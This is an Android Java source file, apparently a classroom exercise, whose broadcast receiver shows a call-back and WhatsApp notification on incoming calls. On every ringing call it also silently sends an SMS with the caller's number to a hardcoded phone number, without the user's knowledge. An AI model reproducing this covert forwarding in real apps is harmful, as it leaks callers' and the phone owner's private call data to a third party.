package com.example.u1angelgonzalesejercicio1tema4;


import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.net.URLEncoder;

public class ReceptorLlamadas extends BroadcastReceiver {

    private static final int ID_NOTIFICACION_CREAR = 1;
    public static final String NOTIFICATION_CHANNEL_ID = "1000";
    public static final String NOTIFICATION_CHANNEL_NAME = "UNJBG";

    @Override public void onReceive(Context context, Intent intent) {
// Sacamos información de la intención
        String estado = "", numero = "";
        Bundle extras = intent.getExtras();

        if (extras != null) {
            estado = extras.getString(TelephonyManager.EXTRA_STATE);
            if (estado.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                numero = extras.getString(
                        TelephonyManager.EXTRA_INCOMING_NUMBER);
                String info = "Ultima llamada recibida de " + ": " + numero;
                String reenvio = "+51952000243";
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(reenvio, null, info,null,null);
                Log.d("ReceptorAnuncio", info + " intent=" + intent);

                //Funciones de cada opcion
                Intent intencionLlamar = new Intent(Intent.ACTION_CALL,
                        Uri.parse("tel:" + numero));
                PendingIntent intencionPendienteLlamar =
                        PendingIntent.getActivity(context,0, intencionLlamar,0);


                Intent intencionmensajewhatsapp = new Intent(Intent.ACTION_VIEW);
                try {

                    String url = "https://api.whatsapp.com/send?phone=" + "+51" + numero + "&text="
                            + URLEncoder.encode("Enviando texto ... ", "UTF-8");
                    intencionmensajewhatsapp.setPackage("com.whatsapp");
                    intencionmensajewhatsapp.setData(Uri.parse(url));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                PendingIntent intencionpendientewhatsapp = PendingIntent.getActivity(context,
                        0, intencionmensajewhatsapp, 0);


// Creamos Notificación
                NotificationCompat.Builder notificacion = new
                        NotificationCompat.Builder(context)
                        .setContentTitle("Información de llamadas")
                        .setContentText(info)
                        .setSmallIcon(R.mipmap.ic_launcher)
                        .addAction(android.R.drawable.ic_menu_call, "MENSAJE WHATSAPP", intencionpendientewhatsapp)
                        .addAction(android.R.drawable.ic_menu_call, "LLAMAR", intencionPendienteLlamar)
                        .setContentIntent(PendingIntent.getActivity(context, 0,
                                new Intent(context, Servicio.class), 0));
                NotificationManager notificationManager = (NotificationManager)
                        context.getSystemService(Context.NOTIFICATION_SERVICE);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    NotificationChannel notificationChannel =
                            new NotificationChannel(
                                    NOTIFICATION_CHANNEL_ID,
                                    NOTIFICATION_CHANNEL_NAME,
                                    NotificationManager.IMPORTANCE_LOW);
                    notificationChannel.enableLights(true);
                    notificationChannel.setLightColor(R.color.colorAccent);
                    notificationManager.createNotificationChannel(notificationChannel);
                    notificacion.setChannelId(NOTIFICATION_CHANNEL_ID);
                }
                notificationManager.notify(ID_NOTIFICACION_CREAR, notificacion.build());
                //notificationManager.notify(1, notificacion.build());
            }
        }
    }
}
